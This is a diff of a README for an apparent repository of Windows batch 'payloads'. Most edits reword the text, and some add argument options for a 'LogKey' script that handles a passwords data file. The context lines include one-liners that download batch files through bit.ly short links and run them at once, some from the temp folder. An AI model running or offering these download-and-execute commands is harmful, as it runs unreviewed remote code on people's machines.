@@ -5,7 +5,7 @@ Some payloads are for personal or educational use only and might not deliver the
 
 
 ## Batchfiles
-Here are the individual batchfiles and how to use them.
+Here are the individual batchfiles and instructions on how to use them.
 > **Warning** <br>
 > It is required to write the script into a file with different name **aside from r.bat** since r.bat is the default name that PLs.bat uses to name a payload it downloaded. If you want to use r.bat as the name of your manually downloaded payload, you may fork the repository and change the configuration variables inside PLs.bat.<br>
 > For scripts that include `cd %temp% &` in the command, you may change **%temp%** to a different folder of your choice. Be sure to select a directory and make sure that the directory is accessible to avoid errors when running the script.
@@ -22,7 +22,7 @@ cmd /c curl -Lo pls.bat https://bit.ly/PLs-bat & pls
 ```
 
 #### Arguments
-Without arguments, or with missing arguments, the script will prompt you for the payload to run and the arguments to pass to it. The following table provides examples of how to run the script with different arguments:
+Without arguments, or with missing arguments, the script will prompt you for the payload to run and the arguments to pass to it. The following table provides examples of how to run the script with different arguments.
 |Index|Example|Description|
 |:---:|:-----:|:--------- |
 |1|**pls 1**|Specifies the **index** of the payload to run (default: none).|
@@ -41,7 +41,7 @@ cmd /c cd %temp% & curl -Lo tk.bat https://bit.ly/PLs-tk & tk
 ```
 
 #### Arguments
-When arguments are missing or not provided, the script will prompt you for the telnet service to connect to. The following table provides examples of how to run the script with different arguments
+When arguments are missing or not provided, the script will prompt you for the telnet service to connect to. Refer to the table below for sample commands that demonstrate how to run the script with different arguments.
 |Index|Example|Description|
 |:---:|:-----:|:--------- |
 |1|**tk 0**|Enable (**1**) or disable (**0**) debug mode (default:0)|
@@ -59,10 +59,14 @@ cmd /c curl -Lo lk.bat https://bit.ly/PLs-lk & lk
 ```
 
 #### Arguments
-This script currently only has one argument, which enables or disables debug mode. However, you can configure the script's variables to specify your own URL and data file name and path. In the future, additional arguments may be added, such as a custom URL or the ability to input data as a string.
+If some arguments are not supplied, the script will utilize the default values specified in the script configuration variables. The table below provides examples of how to run the script with different arguments.
 |Index|Example|Description|
 |:---:|:-----:|:--------- |
-|1|**lk 1**|Enable (**1**) or disable (**0**) debug mode (default:0)|
+|1|**lk 1**|Enable (**1**) or disable (**0**) debug mode (default:0).|
+|2|**lk 0 8**|Specifies the length of the id (default: 8).|
+|3|**lk 0 8 data/database.txt**|Specifies the URL or PATH to get the data from (default: [This Repository](https://raw.githubusercontent.com/Jed556/Payloads/main/LogKey/data.logkey)).|
+|4|**lk 0 8 data/database.txt passwords.txt**|Specifies the name of the data file (default: file name with extension from URL).|
+|5|**lk 0 8 data/database.txt passwords.txt 1**|Enable (**1**) or disable (**0**) data preservation (default:0). This prevents from the data copied (**passwords.txt**) from being deleted after use|
 
 
 
